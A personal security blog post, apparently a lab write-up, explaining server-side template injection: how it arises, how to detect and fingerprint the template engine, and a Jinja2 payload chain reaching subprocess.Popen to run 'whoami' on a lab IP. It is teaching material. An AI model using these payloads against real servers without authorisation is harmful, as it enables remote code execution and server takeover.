@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<meta name="theme-color" content="#494f5c">
+	<meta name="msapplication-TileColor" content="#494f5c">
+<meta itemprop="name" content="Server-Side Template Injection">
+<meta itemprop="description" content="Server-Side Template Injection (SSTI) is an exploit in which the attacker can take advantage of an insecure template engine to inject a malicious payload into a template, which is then executed server-side.
+What is a template engine? A template engine enables you to use static template files in your application. At runtime, the template engine replaces variables in a template file with actual values, and transforms the template into an HTML file sent to the client."><meta itemprop="datePublished" content="2021-06-30T11:41:54&#43;05:30" />
+<meta itemprop="dateModified" content="2021-06-30T11:41:54&#43;05:30" />
+<meta itemprop="wordCount" content="945">
+<meta itemprop="keywords" content="SSTI,Template-Injection,Vulnerability,RCE," /><meta property="og:title" content="Server-Side Template Injection" />
+<meta property="og:description" content="Server-Side Template Injection (SSTI) is an exploit in which the attacker can take advantage of an insecure template engine to inject a malicious payload into a template, which is then executed server-side.
+What is a template engine? A template engine enables you to use static template files in your application. At runtime, the template engine replaces variables in a template file with actual values, and transforms the template into an HTML file sent to the client." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://riteshpuvvada.github.io/posts/ssti/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-06-30T11:41:54&#43;05:30" />
+<meta property="article:modified_time" content="2021-06-30T11:41:54&#43;05:30" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Server-Side Template Injection"/>
+<meta name="twitter:description" content="Server-Side Template Injection (SSTI) is an exploit in which the attacker can take advantage of an insecure template engine to inject a malicious payload into a template, which is then executed server-side.
+What is a template engine? A template engine enables you to use static template files in your application. At runtime, the template engine replaces variables in a template file with actual values, and transforms the template into an HTML file sent to the client."/>
+
+	<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+	<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+	<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+	<link rel="manifest" href="/site.webmanifest">
+	<link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+	<link rel="shortcut icon" href="/favicon.ico">
+
+	<title>Server-Side Template Injection</title>
+	<link rel="stylesheet" href="https://riteshpuvvada.github.io/css/style.min.eac77496566fd7d5768fd650ddb0b2b181ca6a2d7c5fdd6fe6b8ba4bf47e566f.css" integrity="sha256-6sd0llZv19V2j9ZQ3bCysYHKai18X91v5ri6S/R+Vm8=" crossorigin="anonymous">
+	
+</head>
+
+<body id="page">
+	
+	<header id="site-header" class="animated slideInUp">
+		<div class="hdr-wrapper section-inner">
+			<div class="hdr-left">
+				<div class="site-branding">
+					<a href="https://riteshpuvvada.github.io/">Nightmare</a>
+				</div>
+				<nav class="site-nav hide-in-mobile">
+					
+				<a href="https://riteshpuvvada.github.io/about">About</a>
+				<a href="https://riteshpuvvada.github.io/posts">Blog</a>
+				<a href="https://riteshpuvvada.github.io/contact">Contact</a>
+
+				</nav>
+			</div>
+			<div class="hdr-right hdr-icons">
+				<span class="hdr-social hide-in-mobile"><a href="https://www.linkedin.com/in/ritesh-puvvada-656489196/" target="_blank" rel="noopener me" title="Linkedin"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg></a><a href="https://www.instagram.com/riteshpuvvada/" target="_blank" rel="noopener me" title="Instagram"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path><line x1="17.5" y1="6.5" x2="17.5" y2="6.5"></line></svg></a><a href="https://github.com/RiteshPuvvada" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a><a href="mailto:riteshpuvvada@outlook.com" target="_blank" rel="noopener me" title="Email"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg></a><a href="https://twitter.com/RiteshPuvvada" target="_blank" rel="noopener me" title="Twitter"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg></a><a href="https://stackoverflow.com/users/14728649/ritesh" target="_blank" rel="noopener me" title="Stackoverflow"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2.913 16.041v6.848h17.599v-6.848M7.16 18.696h8.925M7.65 13.937l8.675 1.8M9.214 9.124l8.058 3.758M12.086 4.65l6.849 5.66M15.774 1.111l5.313 7.162"/></svg></a></span><button id="menu-btn" class="hdr-btn" title="Menu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
+			</div>
+		</div>
+	</header>
+	<div id="mobile-menu" class="animated fast">
+		<ul>
+			<li><a href="https://riteshpuvvada.github.io/about">About</a></li>
+			<li><a href="https://riteshpuvvada.github.io/posts">Blog</a></li>
+			<li><a href="https://riteshpuvvada.github.io/contact">Contact</a></li>
+		</ul>
+	</div>
+
+
+	<main class="site-main section-inner animated fadeIn faster">
+		<article class="thin">
+			<header class="post-header">
+				<div class="post-meta"><span>Jun 30, 2021</span></div>
+				<h1>Server-Side Template Injection</h1>
+			</header>
+			<div class="content">
+				<p>Server-Side Template Injection (SSTI) is an exploit in which the attacker can take advantage of an insecure template engine to inject a malicious payload into a template, which is then executed server-side.</p>
+<h3 id="what-is-a-template-engine">What is a template engine?<a href="#what-is-a-template-engine" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>A template engine enables you to use static template files in your application. At runtime, the template engine replaces variables in a template file with actual values, and transforms the template into an HTML file sent to the client. This approach makes it easier to design an HTML page.</p>
+<p><img src="/img/blog/SSTI/SSTI.png" alt="img"></p>
+<h3 id="what-is-the-impact-of-server-side-template-injection">What is the impact of server-side template injection?<a href="#what-is-the-impact-of-server-side-template-injection" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<ul>
+<li>SSTI vulnerabilities can expose websites to a variety of attacks.</li>
+<li>As the name suggests, SSTI is a server-side exploit means these vulnerabilities are even more critical.</li>
+<li>At the severe end of the scale, an attacker can potentially achieve Remote Code Execution (RCE).This helps the attacker to take full control of the back-end server.</li>
+</ul>
+<h3 id="how-does-server-side-template-injection-vulnerability-occur">How does server-side template injection vulnerability occur?<a href="#how-does-server-side-template-injection-vulnerability-occur" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>Server-side template injection vulnerabilities arise when user input is concatenated into templates rather than being passed in as data.</p>
+<p>Example :</p>
+<pre><code>$output = $twig-&gt;render(&quot;Dear {first_name},&quot;, array(&quot;first_name&quot; =&gt; $user.first_name) );
+
+$output = $twig-&gt;render(&quot;Dear &quot; . $_GET['name']);
+</code></pre><p>Instead of a static value being passed into the template, part of the template itself is being dynamically generated using the <code>GET</code> parameter <code>name</code>. As template syntax is evaluated server-side, this potentially allows an attacker to place a server-side template injection payload inside the <code>name</code> parameter as follows:</p>
+<pre><code>http://vulnerable-website.com/profile/{{Payload}}
+</code></pre><p><img src="/img/blog/SSTI/SSTI1.png" alt="img"></p>
+<h3 id="methodology">Methodology<a href="#methodology" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>Identifying server-side template injection vulnerabilities and crafting a successful attack typically involves the following high-level process.</p>
+<p><img src="/img/blog/SSTI/attack.png" alt="img"></p>
+<h3 id="detect">Detect<a href="#detect" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>As with any vulnerability, the first step towards exploitation is being able to find it. Perhaps the simplest initial approach is to try fuzzing the template by injecting a sequence of special characters commonly used in template expressions, such as <code>${{ &lt;%[%'&quot;}}% </code>. If an exception is raised, this indicates that the injected template syntax is potentially being interpreted by the server in some way. This is one sign that a vulnerability to server-side template injection may exist.</p>
+<p>Server-side template injection vulnerabilities occur in two distinct contexts, each of which requires its own detection method. Regardless of the results of your fuzzing attempts, it is important to also try the following context-specific approaches. If fuzzing was inconclusive, a vulnerability may still reveal itself using one of these approaches. Even if fuzzing did suggest a template injection vulnerability, you still need to identify its context in order to exploit it.</p>
+<p><img src="/img/blog/SSTI/SSTI2.png" alt="img"></p>
+<h3 id="identify">Identify<a href="#identify" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>Now that we have detected what characters caused the application to error, it is time to identify what template engine is being used.</p>
+<figure class="right"><img src="/img/blog/template-decision-tree.png"
+         alt="image"/><figcaption>
+            <p>Decision tree</p>
+        </figcaption>
+</figure>
+
+<p>Although there are a huge number of templating languages, many of them use very similar syntax that is specifically chosen not to clash with HTML characters. As a result, it can be relatively simple to create probing payloads to test which template engine is being used.</p>
+<p>However, if this is not the case, we can use a decision tree to help us identify the template engine.</p>
+<p>To follow the decision tree, start at the very left and include the variable in your request. Follow the arrow depending on the output:</p>
+<ul>
+<li>Green arrow - The expression evaluated (i.e 42)</li>
+<li>Red arrow - The expression is shown in the output (i.e ${7*7})</li>
+</ul>
+<p>In the case of our example, the process looks as follows:</p>
+<p><img src="/img/blog/SSTI/SSTI3.png" alt="img"></p>
+<p>The application mirrors the user input, so we follow the red arrow:</p>
+<p><img src="/img/blog/SSTI/SSTI4.png" alt="img"></p>
+<p>You should be aware that the same payload can sometimes return a successful response in more than one template language. For example, the payload <code>{{7*'7'}}</code> returns <code>49</code> in <code>Twig</code> and <code>7777777</code> in <code>Jinja2</code>. Therefore, it is important not to jump to conclusions based on a single successful response.</p>
+<p><img src="/img/blog/SSTI/SSTI5.png" alt="img"></p>
+<p>As follows the template engine is being used in this application is <code>Jinja2</code></p>
+<h3 id="syntax">Syntax<a href="#syntax" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>After having identified the template engine, we now need to learn its syntax.</p>
+<p>Where better to learn than the official <a href="https://jinja.palletsprojects.com/en/2.11.x/">documentation</a>?</p>
+<p>In the case of our example, the documentation states the following:</p>
+<ul>
+<li><code>{{</code> - Used to mark the start of a print statement</li>
+<li><code>}}</code> - Used to mark the end of a print statement</li>
+<li><code>{%</code> - Used to mark the start of a block statement</li>
+<li><code>%}</code> - Used to mark the end of a block statement</li>
+</ul>
+<h3 id="exploit">Exploit<a href="#exploit" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>At this point, we know:</p>
+<ul>
+<li>The application is vulnerable to SSTI</li>
+<li>The injection point</li>
+<li>The template engine</li>
+<li>The template engine syntax</li>
+</ul>
+<p>Since <code>Jinja2</code> is a Python based template engine, we will look at ways to run shell commands in Python.</p>
+<p>Python allows us to call the current class instance with <a href="https://docs.python.org/release/2.6.4/library/stdtypes.html#instance.__class__">.<strong>class</strong></a>, we can call this on an empty string:</p>
+<pre><code>Payload: http://10.10.116.231:5000/profile/{{ ''.__class__ }}.
+</code></pre><p><img src="/img/blog/SSTI/SSTI6.png" alt="img"></p>
+<p>Classes in Python have an attribute called <a href="https://docs.python.org/release/2.6.4/library/stdtypes.html#class.__mro__">.<strong>mro</strong></a> that allows us to climb up the inherited object tree:</p>
+<pre><code>Payload: http://10.10.116.231:5000/profile/{{ ''.__class__.__mro__ }}.
+</code></pre><p><img src="/img/blog/SSTI/SSTI7.png" alt="img"></p>
+<p>Since we want the root object, we can access the second property (first index):</p>
+<pre><code>Payload: http://10.10.116.231:5000/profile/{{ ''.__class__.__mro__[1] }}.
+</code></pre><p>Objects in Python have a method called <a href="https://docs.python.org/release/2.6.4/library/stdtypes.html#class.__subclasses__">.<strong>subclassess</strong></a> that allows us to climb down the object tree:</p>
+<pre><code>Payload: http://10.10.116.231:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__() }}.
+</code></pre><p><img src="/img/blog/SSTI/SSTI8.png" alt="img"></p>
+<p>As this whole output is just a Python list, we can access this by using its index. You can find this by either trial and error, or by counting its position in the list.</p>
+<p>In this example, the position in the list is 400 (index 401):</p>
+<pre><code>Payload: http://10.10.116.231:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401] }}.
+</code></pre><p>The above payload essentially calls the <strong>subprocess.Popen</strong> method, now all we have to do is invoke it the system user is visible on the screen.</p>
+<pre><code>Payload: http://10.10.116.231:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401](&quot;whoami&quot;, shell=True, stdout=-1).communicate() }}
+</code></pre><p><img src="/img/blog/SSTI/SSTI9.png" alt="img"></p>
+<p>Note :</p>
+<h4 id="payloads">Payloads<a href="#payloads" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
+<p>For quick reference, an amazing GitHub repo has been created as a cheatsheet for payloads for all web vulnerabilities, including SSTI.</p>
+<p>The repo is located <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">here</a>, while the document for SSTI is located <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">here</a>.</p>
+
+			</div>
+			<hr class="post-end">
+			<footer class="post-info">
+				<p>
+					<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://riteshpuvvada.github.io/tags/ssti">SSTI</a></span><span class="tag"><a href="https://riteshpuvvada.github.io/tags/template-injection">Template-Injection</a></span><span class="tag"><a href="https://riteshpuvvada.github.io/tags/vulnerability">Vulnerability</a></span><span class="tag"><a href="https://riteshpuvvada.github.io/tags/rce">RCE</a></span>
+				</p>
+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>945 Words</p>
+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2021-06-30 11:41 &#43;0530</p>
+			</footer>
+		</article>
+		<div class="post-nav thin">
+			<a class="prev-post" href="https://riteshpuvvada.github.io/posts/bypassing_upload_filters/">
+				<span class="post-nav-label">Older&nbsp;<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg></span><br><span>Bypassing Upload Filters</span>
+			</a>
+		</div>
+		<div id="comments" class="thin">
+</div>
+	</main>
+
+	<footer id="site-footer" class="section-inner thin animated fadeIn faster">
+		<p>&copy; 2021 <a href="https://riteshpuvvada.github.io/">Ritesh Puvvada</a> &#183; <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></p>
+		<p>
+			Made with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> &#183; Theme <a href="https://github.com/Track3/hermit" target="_blank" rel="noopener">Hermit</a> &#183; <a href="https://riteshpuvvada.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a>
+		</p>
+	</footer>
+
+
+
+	<script src="https://riteshpuvvada.github.io/js/bundle.min.7d8545daa55d62427355498dd8da13f98ff79a7938ce7d2a5e2ae1ec0de3beb8.js" integrity="sha256-fYVF2qVdYkJzVUmN2NoT+Y/3mnk4zn0qXirh7A3jvrg=" crossorigin="anonymous"></script>
+	
+
+</body>
+
+</html>
